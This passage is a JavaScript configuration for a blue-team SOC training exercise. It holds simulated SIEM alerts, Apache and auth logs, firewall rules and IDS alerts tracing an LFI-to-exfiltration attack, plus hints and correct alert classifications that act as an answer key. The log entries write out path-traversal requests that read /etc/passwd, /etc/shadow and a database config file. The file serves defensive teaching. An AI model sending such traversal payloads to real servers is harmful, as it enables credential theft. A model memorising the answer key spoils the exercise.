                        trigger: { event: 'flag_correct', match: { flagId: 'contain' } }
                    }
                ]
            },

            // ─────────────────────────────────────────────
            // CERT OBJECTIVES
            // ─────────────────────────────────────────────

            certObjectives: {
                certPath: 'SY0-701',
                mappings: [
                    { flagId: 'detect',   objective: '4.3', description: 'Explain various activities associated with vulnerability management', skill: 'Anomaly Detection — Network Baselines' },
                    { flagId: 'identify', objective: '4.9', description: 'Given a scenario, implement security awareness practices — incident log review', skill: 'Log Analysis — LFI Indicators' },
                    { flagId: 'contain',  objective: '4.4', description: 'Explain security alerting and monitoring concepts — firewall rules', skill: 'Firewall Rule Implementation' },
                    { flagId: 'document', objective: '4.8', description: 'Explain appropriate incident response activities', skill: 'IDS Alert Classification and Triage' }
                ]
            },

            // ─────────────────────────────────────────────
            // BOOT
            // ─────────────────────────────────────────────

            boot: {
                biosLines: [
                    'Dell PowerEdge BIOS v2.18.1',
                    'Initializing hardware...',
                    'Memory Test: 32768 MB OK',
                    'iDRAC: Network interface ready',
                    'Boot device: /dev/sda1 (Ubuntu 22.04)',
                    'Loading GRUB...'
                ],
                grubEntries: [
                    'Ubuntu 22.04.3 LTS (SOC Analyst Workstation)',
                    'Ubuntu 22.04.3 LTS (recovery mode)'
                ],
                loginUser: 'soc-analyst'
            },

            // ─────────────────────────────────────────────
            // DESKTOP
            // ─────────────────────────────────────────────

            desktop: {
                icons: [
                    { id: 'monitoring', label: 'Monitoring',  icon: '\uD83D\uDCCA', app: 'monitoring' },
                    { id: 'logs',       label: 'Log Viewer',  icon: '\uD83D\uDCCB', app: 'logviewer'  },
                    { id: 'firewall',   label: 'Firewall',    icon: '\uD83D\uDD25', app: 'firewall'   },
                    { id: 'ids',        label: 'IDS Panel',   icon: '\uD83D\uDEA8', app: 'ids'        },
                    { id: 'hints',      label: 'Hints',       icon: '\uD83D\uDCA1', app: 'hints'      },
                    { id: 'flags',      label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags'      }
                ]
            },

            // ─────────────────────────────────────────────
            // FLAGS
            // ─────────────────────────────────────────────

            flags: [
                { id: 'detect',   points: 100 },
                { id: 'identify', points: 150 },
                { id: 'contain',  points: 200 },
                { id: 'document', points: 150 }
            ],

            // ─────────────────────────────────────────────
            // SCORING
            // ─────────────────────────────────────────────

            scoring: {
                base: 1000,
                maxScore: 600,
                hintPenalty: true,
                wrongFlagPenalty: -25,
                speedBonus: { threshold: 1500000, points: 100 },
                timeBonusThreshold: 2400
            },

            // ─────────────────────────────────────────────
            // HINTS
            // ─────────────────────────────────────────────

            hints: [
                {
                    id: 'hint_detect',
                    text: "The monitoring dashboard shows a traffic spike from an unusual source IP. Look for any single IP with more than 30 requests in a short window — that's your attacker.",
                    cost: 10,
                    penalty: -10
                },
                {
                    id: 'hint_lfi_logs',
                    text: "In the Log Viewer, filter by source '10.10.99.7' and look for GET requests containing '../' in the path — those are LFI attempts. The config/db.php read is the smoking gun.",
                    cost: 25,
                    penalty: -25
                },
                {
                    id: 'hint_firewall',
                    text: "Add a DROP rule in Firewall Manager: Chain=INPUT, Source=10.10.99.7/32, Port=any, Proto=any. Also add a FORWARD rule blocking outbound to 185.220.101.47 (the C2).",
                    cost: 40,
                    penalty: -40
                },
                {
                    id: 'hint_ids',
                    text: "True Positives: LFI-SCAN, SQLI-ATTEMPT, PORT-SCAN, SSH-BRUTE-FORCE, DATA-EXFIL. False Positives: RATE-LIMIT-TRIGGER, BOT-AGENT (legitimate crawler). Investigate: ANOMALOUS-OUTBOUND.",
                    cost: 50,
                    penalty: -50
                }
            ],

            // ─────────────────────────────────────────────
            // LORE
            // ─────────────────────────────────────────────

            lore: {
                intro: 'You are on shift in the Nexus Corp Security Operations Center. SIEM alert SG-4471 just fired — anomalous traffic from an external IP is hitting nexus-web01. Your job: confirm it\'s a real attack, find the evidence trail, shut the attacker out, and write up the incident. The clock is running.',
                scenario: 'Same attack as Red Team, seen from your side of the glass. The attacker found an LFI vulnerability, read a config file with SSH credentials, escalated privileges, and pivoted to the internal dev server. By the time you\'re looking at this, the exfil may have already started.',
                outro: 'Threat contained. The attacker was blocked before full exfiltration completed. Incident documented. Your SOC report is the starting point for the remediation team.',
                ecer: {
                    executive: 'No WAF deployed on the external portal — cost-cutting decision',
                    culture:   'Understaffed SOC with high alert fatigue — SIEM alerts were suppressed for 14 minutes',
                    employee:  'Developer committed credentials to a web-accessible path',
                    regulatory: 'No mandatory incident response drill — this is the first real event in 8 months'
                }
            },

            // ─────────────────────────────────────────────
            // MONITORING DASHBOARD DATA
            // Pre-populated with the attack timeline as events
            // and alerts, mimicking what a real SIEM would show.
            // ─────────────────────────────────────────────

            monitoring: {
                // Network traffic histogram — spikes mark the attack waves
                // Values are relative request counts per 5-minute window
                traffic: [
                    { value: 12,  label: '08:00' },
                    { value: 15,  label: '08:05' },
                    { value: 11,  label: '08:10' },
                    { value: 14,  label: '08:15' },
                    { value: 9,   label: '08:20' },
                    { value: 13,  label: '08:25' },
                    { value: 18,  label: '08:30' },
                    { value: 16,  label: '08:35' },
                    { value: 22,  label: '08:40' },
                    { value: 87,  label: '08:45', threshold: 40 },   // nmap / dirb scan spike
                    { value: 143, label: '08:50', threshold: 40 },   // LFI enumeration
                    { value: 119, label: '08:55', threshold: 40 },   // LFI exploitation
                    { value: 64,  label: '09:00', threshold: 40 },   // SSH brute
                    { value: 28,  label: '09:05' },
                    { value: 31,  label: '09:10' },
                    { value: 44,  label: '09:15', threshold: 40 },   // lateral movement
                    { value: 98,  label: '09:20', threshold: 40 },   // exfil
                    { value: 19,  label: '09:25' },
                    { value: 14,  label: '09:30' },
                    { value: 11,  label: '09:35' }
                ],

                // Event feed — chronological attack timeline
                events: [
                    { timestamp: '08:43:12', source: 'net-sensor-01',  message: 'Port scan detected: 10.10.99.7 → 10.10.14.20 (SYN to ports 22,80,443,3306)' },
                    { timestamp: '08:44:01', source: 'apache-waf',     message: 'Anomalous request rate: 10.10.99.7 exceeds 50 req/min threshold' },
                    { timestamp: '08:45:33', source: 'apache-waf',     message: 'Directory enumeration: GET /robots.txt, /config/, /backup/ from 10.10.99.7' },
                    { timestamp: '08:46:17', source: 'apache-waf',     message: 'Path traversal attempt: GET /?page=../../etc/passwd from 10.10.99.7' },
                    { timestamp: '08:46:44', source: 'apache-waf',     message: 'LFI exploit: GET /?page=../../../../etc/passwd → HTTP 200 (7 lines returned)' },
                    { timestamp: '08:47:21', source: 'apache-waf',     message: 'LFI exploit: GET /?page=../../../../var/www/html/config/db.php → HTTP 200' },
                    { timestamp: '08:47:55', source: 'auth-monitor',   message: 'SSH authentication attempt: devops@10.10.14.20 from 10.10.99.7' },
                    { timestamp: '08:48:03', source: 'auth-monitor',   message: 'SSH authentication SUCCESS: devops@10.10.14.20 from 10.10.99.7' },
                    { timestamp: '08:49:14', source: 'edr-agent-web01',message: 'Privileged command: sudo su - root executed by devops (uid=1001)' },
                    { timestamp: '08:50:02', source: 'edr-agent-web01',message: 'Root shell spawned on nexus-web01: bash -i (parent: sudo, user: devops→root)' },
                    { timestamp: '09:14:38', source: 'net-sensor-02',  message: 'Internal SSH: 10.10.14.20 → 10.10.14.21 (devops), connection established' },
                    { timestamp: '09:18:22', source: 'edr-agent-dev01',message: 'Unusual file access: /opt/rd_documents/project_helios.txt read by devops' },
                    { timestamp: '09:19:05', source: 'net-sensor-02',  message: 'Outbound SCP transfer: 10.10.14.21 → 185.220.101.47:22 (842 bytes)' },
                    { timestamp: '09:19:31', source: 'dlp-engine',     message: 'Data loss prevention: outbound transfer to non-allowlisted IP 185.220.101.47 detected' }
                ],

                // Alerts — aggregated from the event feed
                alerts: [
                    { name: 'PORT-SCAN-DETECTED',     severity: 'medium',   sourceIP: '10.10.99.7',    description: 'SYN scan across 4 ports from external IP. Possible reconnaissance.' },
                    { name: 'LFI-SCAN',               severity: 'critical', sourceIP: '10.10.99.7',    description: 'Local File Inclusion attempts detected. Attacker read /etc/passwd and /var/www/html/config/db.php via path traversal.' },
                    { name: 'SSH-SUCCESS-EXTERNAL',   severity: 'high',     sourceIP: '10.10.99.7',    description: 'SSH login from external IP to privileged service account (devops) succeeded within 90 seconds of LFI activity.' },
                    { name: 'PRIVILEGED-ESCALATION',  severity: 'critical', sourceIP: '10.10.14.20',   description: 'devops account executed sudo su - root on nexus-web01. NOPASSWD sudo rule exploited.' },
                    { name: 'LATERAL-MOVEMENT-SSH',   severity: 'high',     sourceIP: '10.10.14.20',   description: 'Internal SSH from web server (nexus-web01) to dev server (nexus-dev01). Unusual server-to-server auth pattern.' },
                    { name: 'SENSITIVE-FILE-READ',    severity: 'high',     sourceIP: '10.10.14.21',   description: 'Classified R&D document /opt/rd_documents/project_helios.txt accessed by devops account on dev server.' },
                    { name: 'DATA-EXFIL-OUTBOUND',    severity: 'critical', sourceIP: '10.10.14.21',   description: 'SCP transfer to external IP 185.220.101.47 (known Tor exit node). 842 bytes transferred. DLP triggered.' },
                    { name: 'RATE-LIMIT-TRIGGER',     severity: 'low',      sourceIP: '203.0.113.44',  description: 'Googlebot exceeded rate limit on /sitemap.xml. Likely benign crawler — verify user-agent.' },
                    { name: 'ANOMALOUS-OUTBOUND',     severity: 'medium',   sourceIP: '10.10.14.20',   description: 'Outbound connection on unusual port from web server. Could be C2 beacon or legitimate service. Requires investigation.' },
                    { name: 'BOT-AGENT-DETECTED',     severity: 'low',      sourceIP: '198.51.100.88', description: 'Non-standard user-agent string on port 80. Pattern matches known SEO crawler (SEMrush). Likely false positive.' }
                ]
            },

            // ─────────────────────────────────────────────
            // LOG VIEWER DATA
            // Apache access logs, auth logs, and system logs
            // from nexus-web01 during the attack window.
            // ─────────────────────────────────────────────

            logViewer: {
                entries: [
                    // Normal baseline traffic before attack
                    { timestamp: '2024-03-15 08:30:12', severity: 'info',    source: 'apache/access',  message: '192.168.1.50 - - "GET / HTTP/1.1" 200 3142 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-03-15 08:31:04', severity: 'info',    source: 'apache/access',  message: '192.168.1.51 - - "GET /assets/css/main.css HTTP/1.1" 200 14231' },
                    { timestamp: '2024-03-15 08:33:22', severity: 'info',    source: 'apache/access',  message: '203.0.113.44 - - "GET /sitemap.xml HTTP/1.1" 200 4891 "-" "Googlebot"' },
                    { timestamp: '2024-03-15 08:38:50', severity: 'info',    source: 'auth/sshd',      message: 'Accepted publickey for deploy_svc from 192.168.1.10 port 52441 ssh2' },
                    // Attack begins — recon
                    { timestamp: '2024-03-15 08:43:12', severity: 'warning', source: 'net-sensor',     message: 'SYN_SCAN: src=10.10.99.7 dst=10.10.14.20 ports=[22,80,443,3306] duration=8.4s', suspicious: true },
                    { timestamp: '2024-03-15 08:44:01', severity: 'warning', source: 'apache/access',  message: '10.10.99.7 - - "GET /robots.txt HTTP/1.1" 200 98', suspicious: true },
                    { timestamp: '2024-03-15 08:44:15', severity: 'warning', source: 'apache/access',  message: '10.10.99.7 - - "GET /config/ HTTP/1.1" 403 276', suspicious: true },
                    { timestamp: '2024-03-15 08:44:29', severity: 'warning', source: 'apache/access',  message: '10.10.99.7 - - "GET /backup/ HTTP/1.1" 200 512', suspicious: true },
                    { timestamp: '2024-03-15 08:45:33', severity: 'warning', source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=about HTTP/1.1" 200 1024', suspicious: true },
                    // LFI exploitation
                    { timestamp: '2024-03-15 08:46:17', severity: 'err',     source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../etc/passwd HTTP/1.1" 200 412', suspicious: true },
                    { timestamp: '2024-03-15 08:46:28', severity: 'err',     source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../../etc/passwd HTTP/1.1" 200 412', suspicious: true },
                    { timestamp: '2024-03-15 08:46:44', severity: 'crit',    source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../../../etc/passwd HTTP/1.1" 200 412', suspicious: true },
                    { timestamp: '2024-03-15 08:46:51', severity: 'crit',    source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../../../etc/shadow HTTP/1.1" 403 0', suspicious: true },
                    { timestamp: '2024-03-15 08:47:03', severity: 'err',     source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../../../etc/apache2/sites-enabled/000-default.conf HTTP/1.1" 200 881', suspicious: true },
                    { timestamp: '2024-03-15 08:47:21', severity: 'crit',    source: 'apache/access',  message: '10.10.99.7 - - "GET /?page=../../../../var/www/html/config/db.php HTTP/1.1" 200 347', suspicious: true },
                    // SSH auth
                    { timestamp: '2024-03-15 08:47:55', severity: 'warning', source: 'auth/sshd',      message: 'Invalid user admin from 10.10.99.7 port 58841', suspicious: true },
                    { timestamp: '2024-03-15 08:47:58', severity: 'warning', source: 'auth/sshd',      message: 'Failed password for devops from 10.10.99.7 port 58841 ssh2', suspicious: true },
                    { timestamp: '2024-03-15 08:48:03', severity: 'crit',    source: 'auth/sshd',      message: 'Accepted password for devops from 10.10.99.7 port 58843 ssh2', suspicious: true },
                    // Privilege escalation
                    { timestamp: '2024-03-15 08:49:14', severity: 'crit',    source: 'auth/sudo',      message: 'devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/su -', suspicious: true },
                    { timestamp: '2024-03-15 08:50:02', severity: 'crit',    source: 'auth/sudo',      message: 'pam_unix(sudo:session): session opened for user root by devops(uid=1001)', suspicious: true },
                    // Normal activity (noise)
                    { timestamp: '2024-03-15 09:00:44', severity: 'info',    source: 'apache/access',  message: '192.168.1.52 - - "GET / HTTP/1.1" 200 3142 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-03-15 09:05:19', severity: 'info',    source: 'syslog',         message: 'CRON[3841]: (root) CMD (/usr/bin/certbot renew --quiet)' },
                    // Lateral movement
                    { timestamp: '2024-03-15 09:14:38', severity: 'crit',    source: 'auth/sshd',      message: 'Accepted password for devops from 10.10.14.20 port 41209 ssh2 [nexus-dev01]', suspicious: true },
                    // Exfiltration
                    { timestamp: '2024-03-15 09:18:22', severity: 'crit',    source: 'edr/file',       message: 'Sensitive file read: /opt/rd_documents/project_helios.txt by devops (uid=1001)', suspicious: true },
                    { timestamp: '2024-03-15 09:19:05', severity: 'crit',    source: 'net-sensor',     message: 'Outbound SCP: src=10.10.14.21:41802 dst=185.220.101.47:22 bytes=842 duration=0.8s', suspicious: true },
                    { timestamp: '2024-03-15 09:19:31', severity: 'crit',    source: 'dlp-engine',     message: 'DLP ALERT: Outbound transfer to 185.220.101.47 matches classified document signature (project_helios)', suspicious: true }
                ]
            },

            // ─────────────────────────────────────────────
            // FIREWALL MANAGER DATA
            // Starts with overly permissive rules.
            // Student must add blocking rules to earn flag.
            // ─────────────────────────────────────────────

            firewall: {
                rules: [
                    { chain: 'INPUT',   src: '0.0.0.0/0',        dst: '10.10.14.20', port: '80',   protocol: 'tcp', action: 'ACCEPT' },
                    { chain: 'INPUT',   src: '0.0.0.0/0',        dst: '10.10.14.20', port: '22',   protocol: 'tcp', action: 'ACCEPT' },
                    { chain: 'INPUT',   src: '0.0.0.0/0',        dst: '10.10.14.20', port: 'any',  protocol: 'any', action: 'ACCEPT' },
                    { chain: 'OUTPUT',  src: '10.10.14.0/24',    dst: '0.0.0.0/0',   port: 'any',  protocol: 'any', action: 'ACCEPT' },
                    { chain: 'FORWARD', src: '10.10.14.0/24',    dst: '0.0.0.0/0',   port: 'any',  protocol: 'any', action: 'ACCEPT' }
                ]
            },

            // ─────────────────────────────────────────────
            // IDS PANEL DATA
            // Mix of true positives, false positives, and
            // one ambiguous alert requiring investigation.
            // Student classifies each to earn the doc flag.
            // ─────────────────────────────────────────────

            ids: {
                alerts: [
                    {
                        sid: 'SG-4471',
                        signature: 'ET SCAN Potential SSH Scan',
                        severity: 'medium',
                        timestamp: '2024-03-15 08:43:15',
                        srcIP: '10.10.99.7', dstIP: '10.10.14.20', dstPort: 22,
                        detail: 'Multiple SSH connection attempts from single source in a 30-second window. Matches SSH brute-force reconnaissance pattern.',
                        correctClassification: 'tp',
                        mitre: 'T1110.001'
                    },
                    {
                        sid: 'SG-4472',
                        signature: 'ET WEB_SERVER PHP File Inclusion Attempt',
                        severity: 'critical',
                        timestamp: '2024-03-15 08:46:17',
                        srcIP: '10.10.99.7', dstIP: '10.10.14.20', dstPort: 80,
                        detail: 'GET request contains path traversal sequence (../../) in query parameter. Target: /?page=../../../../etc/passwd. Server returned HTTP 200 — include succeeded.',
                        correctClassification: 'tp',
                        mitre: 'T1190'
                    },
                    {
                        sid: 'SG-4473',
                        signature: 'ET WEB_SERVER Potential LFI Configuration File Read',
                        severity: 'critical',
                        timestamp: '2024-03-15 08:47:21',
                        srcIP: '10.10.99.7', dstIP: '10.10.14.20', dstPort: 80,
                        detail: 'LFI request targeting PHP configuration file path: /?page=../../../../var/www/html/config/db.php. Response size 347 bytes — file likely returned. Credential exposure likely.',
                        correctClassification: 'tp',
                        mitre: 'T1552.001'
                    },
                    {
                        sid: 'SG-4474',
                        signature: 'ET POLICY Googlebot User-Agent Detected',
                        severity: 'low',
                        timestamp: '2024-03-15 08:33:22',
                        srcIP: '203.0.113.44', dstIP: '10.10.14.20', dstPort: 80,
                        detail: 'Request from IP 203.0.113.44 with Googlebot user-agent to /sitemap.xml. IP is within Google ASN range (AS15169). Normal crawl behavior.',
                        correctClassification: 'fp',
                        mitre: null
                    },
                    {
                        sid: 'SG-4475',
                        signature: 'ET EXPLOIT Sudo Privilege Escalation Detected',
                        severity: 'critical',
                        timestamp: '2024-03-15 08:49:14',
                        srcIP: '10.10.14.20', dstIP: '10.10.14.20', dstPort: 0,
                        detail: 'Local privilege escalation: devops account executed sudo su - root. NOPASSWD rule in /etc/sudoers allows full root without password. Root session active.',
                        correctClassification: 'tp',
                        mitre: 'T1548.003'
                    },
                    {
                        sid: 'SG-4476',
                        signature: 'ET POLICY Outbound SSH to Non-Standard Destination',
                        severity: 'medium',
                        timestamp: '2024-03-15 09:19:05',
                        srcIP: '10.10.14.21', dstIP: '185.220.101.47', dstPort: 22,
                        detail: 'Outbound SSH/SCP connection from internal dev server to external IP 185.220.101.47. IP is listed in Tor exit node blocklist. 842 bytes transferred. May be data exfiltration.',
                        correctClassification: 'inv',
                        mitre: 'T1041'
                    },
                    {
                        sid: 'SG-4477',
                        signature: 'ET SCAN Non-Standard User-Agent Bot',
                        severity: 'low',
                        timestamp: '2024-03-15 09:08:44',
                        srcIP: '198.51.100.88', dstIP: '10.10.14.20', dstPort: 80,
                        detail: 'Request with user-agent "SEMrushBot/3.0". IP belongs to SEMrush infrastructure ASN. Standard SEO crawler behavior — not a security threat.',
                        correctClassification: 'fp',
                        mitre: null
                    }
                ]
            }
        }
    }
};
